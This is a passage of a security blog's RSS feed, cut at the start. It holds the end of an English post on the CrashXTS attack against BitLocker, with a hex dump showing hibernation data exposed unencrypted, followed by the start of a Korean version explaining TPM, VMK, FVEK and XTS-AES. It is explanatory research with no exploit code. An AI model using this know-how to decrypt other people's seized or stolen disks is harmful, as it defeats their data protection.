class="hljs-number">0x00000070</span>  <span class="hljs-number">7</span>c <span class="hljs-number">13</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> fc <span class="hljs-number">57</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    |........W......<span class="hljs-number">0x00000080</span>  a7 bf <span class="hljs-number">12</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">82</span> <span class="hljs-number">99</span> a9 <span class="hljs-number">68</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ...........h....</code></pre><p>Comparing the raw sectors before and after the exploit: before the exploit, a byte sequence that looks random due to the nature of ciphertext is observed. However, after the exploit, we can observe the <strong>hibernation header starting with the <code>HIBR</code> signature exactly as it is!</strong> In other words, we can confirm that dump/hibernation data is exposed in an unencrypted form in the special path.</p><h3 id="2-4-Reliability-vs-Randomization"><a href="#2-4-Reliability-vs-Randomization" class="headerlink" title="2.4 Reliability vs. Randomization"></a>2.4 Reliability vs. Randomization</h3><p>The core of probabilistic vulnerabilities like CrashXTS is corruption through lack of integrity. However, this reaction varies easily depending on the Windows system, version, and state, making it difficult to actually induce. Even with the same Windows version, the internal structure of the registry hive and file layout vary depending on installation history, update history, and driver installation/removal. Therefore, differential analysis must be performed from scratch for every system, making automation of this process virtually impossible. Also, even if BitLocker policies change, already encrypted blocks are not re-encrypted; however, since the layout itself changes depending on operation history, a problem arises where an attack location that succeeded once may not work at all on another system.</p><h2 id="3-Conclusion"><a href="#3-Conclusion" class="headerlink" title="3. Conclusion"></a>3. Conclusion</h2><p><img src="/2026/01/22/banda/BitLocker_part1/en/image16.png" alt></p><p>CrashXTS empirically demonstrated the fundamental limitations of XTS, but it is somewhat limited in terms of practicality. Therefore, for BitLocker, rather than causing corruption of the encryption mode block itself, let&#x2019;s look into exploits using <strong>logical flaws</strong> such as WinRE verification omissions, recovery path defects, and key management errors.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://dfir.ru/wp-content/uploads/2025/01/crashxts.pdf">https://dfir.ru/wp-content/uploads/2025/01/crashxts.pdf</a></li><li><a href="https://csrc.nist.gov/csrc/media/projects/block-cipher-techniques/documents/bcm/comments/xts/follow-up_xts_comments-ball.pdf">https://csrc.nist.gov/csrc/media/projects/block-cipher-techniques/documents/bcm/comments/xts/follow-up_xts_comments-ball.pdf</a></li><li><a href="https://dfir.ru/2025/01/20/cve-2025-21210-aka-crashxts-a-practical-randomization-attack-against-bitlocker/">https://dfir.ru/2025/01/20/cve-2025-21210-aka-crashxts-a-practical-randomization-attack-against-bitlocker/</a></li><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21210">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21210</a></li><li><a href="https://www.iaesjournal.com/windows-bitlocker-bug-leaks-aes-xts-encryption/">https://www.iaesjournal.com/windows-bitlocker-bug-leaks-aes-xts-encryption/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/BitLocker/">BitLocker</category>
      
      <category domain="https://hackyboiz.github.io/tags/CrashXTS/">CrashXTS</category>
      
      <category domain="https://hackyboiz.github.io/tags/AES-XTS/">AES-XTS</category>
      
      
      <comments>https://hackyboiz.github.io/2026/01/22/banda/BitLocker_part1/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Unlocking BitLocker: Windows Full-Disk Encryption Under Attack: Part 1 (KR)</title>
      <link>https://hackyboiz.github.io/2026/01/22/banda/BitLocker_part1/ko/</link>
      <guid>https://hackyboiz.github.io/2026/01/22/banda/BitLocker_part1/ko/</guid>
      <pubDate>Thu, 22 Jan 2026 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;1-Introduction&quot;&gt;&lt;a href=&quot;#1-Introduction&quot; class=&quot;headerlink&quot; title=&quot;1. Introduction&quot;&gt;&lt;/a&gt;1. Introduction&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2026/01/2</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h2><p><img src="/2026/01/22/banda/BitLocker_part1/ko/logo.jpg" alt></p><p>BitLocker&#xC740; Windows &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC5D0; &#xB0B4;&#xC7A5;&#xB41C; &#xB514;&#xC2A4;&#xD06C; &#xC554;&#xD638;&#xD654; &#xAE30;&#xB2A5;&#xC73C;&#xB85C;, &#xC7A5;&#xCE58;&#xAC00; &#xBD84;&#xC2E4;&#xB418;&#xAC70;&#xB098; &#xB3C4;&#xB09C;&#xB418;&#xC5B4; &#xC624;&#xD504;&#xB77C;&#xC778; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC811;&#xADFC;&#xD574;&#xB3C4; &#xB0B4;&#xC6A9;&#xC744; &#xC77D;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xC7A5;&#xCE58;&#xC785;&#xB2C8;&#xB2E4;. BitLocker&#xC740; XTS-AES&#xC640; TPM&#xC758; &#xACB0;&#xD569; &#xAD6C;&#xC870;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xAC15;&#xB825;&#xD55C; &#xD0A4; &#xBCF4;&#xD638;&#xC640; &#xB370;&#xC774;&#xD130; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xC9C0;&#xB9CC;, &#xC554;&#xD638;&#xBB38; &#xC790;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xBB34;&#xACB0;&#xC131; &#xBCF4;&#xD638;&#xAC00; &#xC81C;&#xACF5;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; AES-XTS &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC774;&#xD574;&#xD574;&#xBCF4;&#xBA70; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBC1C;&#xACAC;&#xD560; &#xC218; &#xC788;&#xB294; <a href="https://dfir.ru/2025/01/20/cve-2025-21210-aka-crashxts-a-practical-randomization-attack-against-bitlocker/">BitLocker CrashXTS</a>&#xC758; &#xBC29;&#xC2DD;&#xC744; &#xD568;&#xAED8; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-1-&#xBD80;&#xD305;&#xC2DC;&#xC2A4;&#xD15C;-&#xC774;&#xD574;"><a href="#1-1-&#xBD80;&#xD305;&#xC2DC;&#xC2A4;&#xD15C;-&#xC774;&#xD574;" class="headerlink" title="1.1 &#xBD80;&#xD305;&#xC2DC;&#xC2A4;&#xD15C; &#xC774;&#xD574;"></a>1.1 &#xBD80;&#xD305;&#xC2DC;&#xC2A4;&#xD15C; &#xC774;&#xD574;</h3><p>UEFI &#xD38C;&#xC6E8;&#xC5B4;&#xB294; EFI System Partition(ESP)&#xC5D0;&#xC11C; &#xC11C;&#xBA85;&#xB41C; bootmgfw.efi&#xC640; BCD(&#xBD80;&#xD305; &#xAD6C;&#xC131; &#xB370;&#xC774;&#xD130;)&#xB97C; &#xC77D;&#xC5B4;&#xB4E4;&#xC774;&#xBA70;, &#xC774; &#xAD6C;&#xAC04;&#xC740; &#xD3C9;&#xBB38;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Secure Boot&#xB294; &#xC774; &#xBD80;&#xD305; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xCCB4;&#xC778;&#xC758; DBX&#xB97C; &#xAC80;&#xC0AC;&#xD574; &#xC2E0;&#xB8B0; &#xACBD;&#xB85C;&#xB97C; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. ESP &#xBD80;&#xD2B8; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB294; &#xC77D;&#xD788;&#xB418;, &#xC2E0;&#xB8B0; &#xAC80;&#xC99D;&#xC774; &#xD1B5;&#xACFC;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; VMK unseal&#xC774; &#xAC70;&#xBD80;&#xB418;&#xACE0; &#xBCF5;&#xAD6C; &#xACBD;&#xB85C;&#xB85C; &#xC774;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image1.png" alt></p><p>TPM &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xCE69;</p><p>&#xC554;&#xD638;&#xD654;&#xB41C; &#xC601;&#xC5ED;&#xC5D0;&#xB294; &#xB2E8;&#xC21C;&#xD788; &#xC0AC;&#xC6A9;&#xC790; &#xD30C;&#xC77C;&#xB9CC; &#xC788;&#xC744;&#xAE4C;&#xC694;? &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. BitLocker&#xB294; &#xBCFC;&#xB968; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xC5D0; &#xD0A4; &#xBCF4;&#xD638;&#xC790;(Key Protector)&#xC640; &#xD0A4; &#xACC4;&#xCE35;&#xC744; &#xAE30;&#xC220;&#xD574;&#xB450;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C;&#xB294; VMK(Volume Master Key)&#xC640; FVEK(Full Volume Encryption Key)&#xC758; 2&#xACC4;&#xCE35; &#xD0A4; &#xC124;&#xACC4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xACE0;, &#xC2E4;&#xC81C;&#xB85C; &#xBE14;&#xB85D; &#xC554;&#xD638;&#xD654;/&#xBCF5;&#xD638;&#xD654;&#xC5D0; &#xC4F0;&#xC774;&#xB294; &#xAC83;&#xC740; FVEK&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image2.png" alt></p><p>&#xC704; &#xD654;&#xBA74;&#xC740; <code>manage-bde -protectors -get C:</code> &#xBA85;&#xB839;&#xC73C;&#xB85C; C: &#xBCFC;&#xB968;&#xC5D0; &#xB4F1;&#xB85D;&#xB41C; &#xD0A4; &#xBCF4;&#xD638;&#xAE30;(Key Protector)&#xB97C; &#xC870;&#xD68C;&#xD55C; &#xACB0;&#xACFC;&#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xBCF4;&#xC774;&#xB294; &#xC22B;&#xC790; &#xC554;&#xD638;&#xB294; VMK&#xB97C; &#xD574;&#xC81C;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBCF4;&#xD638;&#xAE30; &#xC911; &#xD558;&#xB098;&#xB85C;, &#xC815;&#xC0C1; &#xBD80;&#xD305; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; TPM &#xAE30;&#xBC18; unseal&#xC774; &#xC2E4;&#xD328;&#xD558;&#xAC70;&#xB098; &#xBCF5;&#xAD6C; &#xBAA8;&#xB4DC;&#xB85C; &#xC804;&#xD658;&#xB420; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBCF5;&#xAD6C; &#xC218;&#xB2E8;&#xC785;&#xB2C8;&#xB2E4;. &#xC989; BitLocker &#xBCFC;&#xB968;&#xC5D0;&#xB294; &#xB2E8;&#xC21C;&#xD788; &#xB370;&#xC774;&#xD130;&#xB9CC; &#xC554;&#xD638;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C;, VMK&#xB97C; &#xC5B4;&#xB5A4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBCF5;&#xC6D0;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xD638;&#xAE30; &#xC815;&#xBCF4;&#xC640; &#xD0A4; &#xACC4;&#xCE35;(VMK &#x2192; FVEK)&#xC774; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xD615;&#xD0DC;&#xB85C; &#xD568;&#xAED8; &#xC874;&#xC7AC;&#xD558;&#xBA70;, &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; FVEK&#xAC00; &#xC139;&#xD130; &#xB2E8;&#xC704; &#xC554;&#xBCF5;&#xD638;&#xD654;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; 2&#xACC4;&#xCE35; &#xD0A4; &#xC124;&#xACC4;&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC791;&#xB3D9;&#xD558;&#xB294;&#xC9C0; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574;, &#xAC01; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xD575;&#xC2EC;&#xC801;&#xC778; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; TPM, VMK, FVEK&#xC5D0; &#xB300;&#xD574; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.  <br><br></p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image17.png" alt></p><p><strong>TPM</strong></p><p>TPM&#xC740; &#xC554;&#xD638;&#xD654; &#xD0A4;, &#xCE74;&#xC6B4;&#xD130; &#xB4F1;&#xC744; &#xCE69; &#xB0B4;&#xBD80;&#xC5D0; &#xACA9;&#xB9AC;&#xD574; &#xBCF4;&#xAD00;&#xD558;&#xB294; &#xBCF4;&#xC548; &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#x2018;&#xBBFF;&#xC744; &#xC218; &#xC788;&#xB294; &#xC0C1;&#xD0DC;&#xB85C; &#xBD80;&#xD305;&#xB418;&#xC5C8;&#xB294;&#xC9C0;&#x2019; &#xBD80;&#xD305; &#xC2E0;&#xB8B0;&#xB3C4; &#xCE21;&#xC815;&#xAC12;(PCR - Platform Configuration Register)&#xC744; &#xD1B5;&#xD574; &#xBE44;&#xBC00; &#xD0A4;&#xB97C; &#xAEBC;&#xB0B4; &#xC4F8; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; dTPM &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xCE69;&#xC785;&#xB2C8;&#xB2E4;.</p><p>BitLocker&#xB294; VMK&#xB97C; &#xD2B9;&#xC815; PCR &#xAC12;&#xC5D0; seal&#xD569;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; PCR 7(Secure Boot &#xC0C1;&#xD0DC;, UEFI &#xBCC0;&#xC218;, Boot Manager &#xCF54;&#xB4DC;)&#xACFC; PCR 11(BitLocker &#xC561;&#xC138;&#xC2A4; &#xC81C;&#xC5B4;)&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xBD80;&#xD305; &#xCCB4;&#xC778;&#xC774; &#xC815;&#xC0C1;&#xC774;&#xBA74; TPM&#xC740; VMK &#xD574;&#xC81C;(unseal)&#xB97C; &#xD5C8;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xBD80;&#xD305; &#xCCB4;&#xC778;&#xC774; &#xBCC0;&#xC870;&#xB418;&#xC5C8;&#xC744; &#xACBD;&#xC6B0; PCR &#xAC12;&#xC774; &#xB2EC;&#xB77C;&#xC838; unseal&#xC774; &#xC2E4;&#xD328;&#xD558;&#xACE0; &#xBCF5;&#xAD6C; &#xD654;&#xBA74;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;.  <br><br></li></ul><p><strong>VMK (Volume Master Key)</strong><br>VMK&#xB294; FVEK&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xC0C1;&#xC704; &#xD0A4;&#xC785;&#xB2C8;&#xB2E4;. VMK&#xB97C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xBCF5;&#xC6D0;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xBA74; FVEK&#xB97C; &#xD480; &#xC218;&#xAC00; &#xC5C6;&#xACE0; &#xB530;&#xB77C;&#xC11C; &#xC139;&#xD130; &#xD3C9;&#xBB38;&#xC5D0;&#xB3C4; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. VMK&#xB294; &#xC5EC;&#xB7EC; &#xBCF4;&#xD638;&#xC790;&#xB85C; &#xB798;&#xD551;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li>TPM Protector: TPM PCR&#xC5D0; &#xBC14;&#xC778;&#xB529;</li><li>Recovery Password Protector: 48&#xC790;&#xB9AC; &#xC22B;&#xC790; &#xBCF5;&#xAD6C; &#xD0A4;</li><li>Password Protector: &#xC0AC;&#xC6A9;&#xC790; &#xC554;&#xD638;</li><li>TPM+PIN Protector: TPM&#xACFC; PIN &#xC870;&#xD569;  <br><br></li></ul><p><strong>FVEK (Full Volume Encryption Key)</strong><br>FVEK&#xB294; &#xB514;&#xC2A4;&#xD06C; &#xC139;&#xD130;&#xC758; &#xC2E4;&#xC81C; &#xC554;&#xD638;&#xD654;&#xB97C; &#xB2F4;&#xB2F9;&#xD558;&#xBA70;, FVEK&#xAC00; &#xC554;&#xD638;&#xD654;&#xD558;&#xB294; &#xB300;&#xC0C1;&#xC5D0;&#xB294; &#xCEE4;&#xB110;, &#xB4DC;&#xB77C;&#xC774;&#xBC84;, &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;, &#xC0AC;&#xC6A9;&#xC790; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBAA8;&#xB450; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;. FVEK&#xB294; AES-256(&#xB610;&#xB294; AES-128) &#xD0A4;&#xC774;&#xBA70;, XTS &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC2E4;&#xC81C;&#xB85C; 512&#xBE44;&#xD2B8;(&#xB610;&#xB294; 256&#xBE44;&#xD2B8;)&#xAC00; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC808;&#xBC18;&#xC740; &#xB370;&#xC774;&#xD130; &#xC554;&#xD638;&#xD654;&#xC6A9;(K1), &#xC808;&#xBC18;&#xC740; tweak &#xC0DD;&#xC131;&#xC6A9;(K2)&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;!  <br><br></p><p><strong>BitLocker &#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xB3D9;&#xC791; &#xC6D0;&#xB9AC;</strong></p><p>&#xCEE4;&#xB110;&#xC774; &#xC62C;&#xB77C;&#xC624;&#xBA74; BitLocker &#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC778; fvevol.sys&#xAC00; &#xB514;&#xC2A4;&#xD06C; I/O&#xB97C; &#xAC00;&#xB85C;&#xCC44;&#xC11C; &#xC554;&#xD638;&#xD654;, &#xBCF5;&#xD638;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294;&#xB370;&#xC694;. &#xC774;&#xAC78; &#xC5B4;&#xB5BB;&#xAC8C; &#xC218;&#xD589;&#xD558;&#xB294;&#xC9C0; &#xD55C;&#xBC88; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><ol><li>&#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xBD80;&#xD305;&#xD560; &#xB54C; <code>winload.efi</code>&#xAC00; &#xCEE4;&#xB110;&#xACFC; <code>BOOT_START(0)</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB4E4;&#xC744; &#xC801;&#xC7AC;&#xD558;&#xBA70;, <code>fvevol.sys</code>&#xB3C4; &#xD568;&#xAED8; &#xBA3C;&#xC800; &#xC62C;&#xB77C;&#xAC11;&#xB2C8;&#xB2E4;. &#xC774; &#xC2DC;&#xC810;&#xC740; NTFS&#xAC00; &#xC2DC;&#xC2A4;&#xD15C; &#xBCFC;&#xB968;&#xC744; &#xB9C8;&#xC6B4;&#xD2B8;&#xD558;&#xAE30; &#xC804;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xD0A4;&#xAC00; &#xC900;&#xBE44;&#xB418;&#xAE30; &#xC804; &#xBD80;&#xD305; &#xCD08;&#xAE30;&#xC5D0; TPM&#xC758; PCR 7/11 &#xAC80;&#xC99D;&#xC774; &#xC544;&#xC9C1; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xACE0; VMK/FVEK&#xC774; &#xC900;&#xBE44; &#xC804; &#xC0C1;&#xD0DC;&#xC77C; &#xB54C;, <code>fvevol.sys</code>&#xB294; locked &#xC0C1;&#xD0DC;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; bootmgr&#xB098; winload&#xAC19;&#xC740; &#xBD80;&#xD2B8; &#xD658;&#xACBD;&#xC774; FVE-FS(&#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;)&#xB97C; &#xC77D;&#xC5B4; TPM &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0;, VMK&#xB97C; unseal &#xD55C; &#xB4A4;&#xC5D0; FVEK&#xB97C; &#xBCF5;&#xD638;&#xD569;&#xB2C8;&#xB2E4;.</li><li>VMK&#xAC00; unseal&#xB418;&#xACE0; FVEK&#xAC00; &#xBCF5;&#xD638;&#xB41C; &#xC2DC;&#xC810;&#xC77C; &#xB54C;&#xAC00; &#xB418;&#xC5B4;&#xC11C;&#xC57C; fvevol&#xC740; unlocked &#xC0C1;&#xD0DC;&#xB85C; &#xC804;&#xD658;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xC2DC;&#xC810;&#xBD80;&#xD130; &#xD574;&#xB2F9; &#xBCFC;&#xB968;&#xC758; &#xBAA8;&#xB4E0; &#xB370;&#xC774;&#xD130; I/O&#xB294; &#xAC01; FVEK&#xB97C; &#xD1B5;&#xD574; &#xD22C;&#xBA85; &#xC554;&#xD638;&#xD654;, &#xBCF5;&#xD638;&#xD654;&#xAC00; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.  <br><br></li></ol><p>&#xC989;, <code>&#xC571;/&#xC11C;&#xBE44;&#xC2A4;</code> &#x2192; <code>NTFS(ReFS)</code> &#x2192; <code>I/O Manager</code> &#x2192; <code>[fvevol]</code> &#x2192; <code>volmgr/&#xC800;&#xC7A5;&#xC18C; &#xD074;&#xB798;&#xC2A4;</code> &#x2192; <code>&#xD3EC;&#xD2B8;/&#xBBF8;&#xB2C8;&#xD3EC;&#xD2B8;(NVMe/SATA)</code> &#x2192; <code>&#xB514;&#xC2A4;&#xD06C;</code> &#xC21C;&#xC11C;&#xB85C; &#xB0B4;&#xB824;&#xAC11;&#xB2C8;&#xB2E4;. </p><p>BitLocker&#xC758; &#xD575;&#xC2EC; &#xC554;&#xD638;&#xD654; &#xBC29;&#xC2DD;&#xC778; <strong>XTS-AES</strong>&#xB294; &#xB514;&#xC2A4;&#xD06C; &#xC139;&#xD130; &#xB2E8;&#xC704;&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD558;&#xBA70;, &#xAC01; &#xBE14;&#xB85D;&#xC5D0; <strong>tweak &#xAC12;(&#xC139;&#xD130;/&#xC624;&#xD504;&#xC14B; &#xAE30;&#xBC18;)</strong>&#xC744; &#xC801;&#xC6A9;&#xD574; &#xB3D9;&#xC77C;&#xD55C; &#xD3C9;&#xBB38;&#xC774;&#xB77C;&#xB3C4; &#xC704;&#xCE58;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB978; &#xC554;&#xD638;&#xBB38;&#xC774; &#xC0DD;&#xC131;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xC124;&#xACC4;&#xB294; CTR/CBC &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB358; <strong>malleability(&#xBCC0;&#xD615; &#xAC00;&#xB2A5;&#xC131;)</strong>, &#xC989; &#xC554;&#xD638;&#xBB38;&#xC744; &#xC9C1;&#xC811; &#xC870;&#xC791;&#xD574; &#xD3C9;&#xBB38;&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xB97C; &#xC644;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB3C4;&#xC785;&#xB41C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC774;&#xB7EC;&#xD55C; XTS &#xAD6C;&#xC870;&#xC870;&#xCC28; &#xC644;&#xBCBD;&#xD788; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC74C;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xC0AC;&#xB840;&#xB97C; &#xC624;&#xB298; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="2-Windows&#xC758;-AES-CBC&#xC640;-AES-XTS-&#xC6B4;&#xC6A9;-&#xBAA8;&#xB4DC;"><a href="#2-Windows&#xC758;-AES-CBC&#xC640;-AES-XTS-&#xC6B4;&#xC6A9;-&#xBAA8;&#xB4DC;" class="headerlink" title="2. Windows&#xC758; AES-CBC&#xC640; AES-XTS &#xC6B4;&#xC6A9; &#xBAA8;&#xB4DC;"></a>2. Windows&#xC758; AES-CBC&#xC640; AES-XTS &#xC6B4;&#xC6A9; &#xBAA8;&#xB4DC;</h2><h3 id="2-1-XTS&#xC758;-&#xC554;&#xD638;&#xD654;-&#xBC29;&#xC2DD;"><a href="#2-1-XTS&#xC758;-&#xC554;&#xD638;&#xD654;-&#xBC29;&#xC2DD;" class="headerlink" title="2.1 XTS&#xC758; &#xC554;&#xD638;&#xD654; &#xBC29;&#xC2DD;"></a><strong>2.1 XTS&#xC758; &#xC554;&#xD638;&#xD654; &#xBC29;&#xC2DD;</strong></h3><p>&#xC55E;&#xC11C; BitLocker&#xAC00; FVEK&#xB85C; &#xC139;&#xD130; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xB294;&#xB370;&#xC694;. &#xC624;&#xB298; &#xC124;&#xBA85;&#xD560; &#xCDE8;&#xC57D;&#xC131;&#xC744; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; <strong>&#x2018;&#xB514;&#xC2A4;&#xD06C;&#xB77C;&#xB294; &#xB9E4;&#xCCB4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC6B4;&#xC6A9; &#xBAA8;&#xB4DC;&#x2019;</strong>&#xC5D0; &#xCD08;&#xC810;&#xC744; &#xB46C;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xD78C;&#xD2B8;&#xB97C; &#xD558;&#xB098; &#xB4DC;&#xB9AC;&#xC790;&#xBA74; &#xB514;&#xC2A4;&#xD06C;&#xB294; &#x2018;&#xC139;&#xD130;&#xB77C;&#xB294; &#xD2B9;&#xC815; &#xC704;&#xCE58;&#xB97C; &#xC784;&#xC758;&#xB85C; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xC561;&#xC138;&#xC2A4; &#xB9E4;&#xCCB4;&#x2019;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; BitLocker&#xB294; &#xB79C;&#xB364;&#xD55C; &#xC561;&#xC138;&#xC2A4;&#xC5D0;&#xC11C;&#xB3C4; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xBE14;&#xB85D; &#xC554;&#xD638; &#xC6B4;&#xC6A9; &#xBAA8;&#xB4DC;&#xC5EC;&#xC57C; &#xCDE8;&#xC57D;&#xC131;&#xC774; &#xB098;&#xD0C0;&#xB098;&#xC9C0; 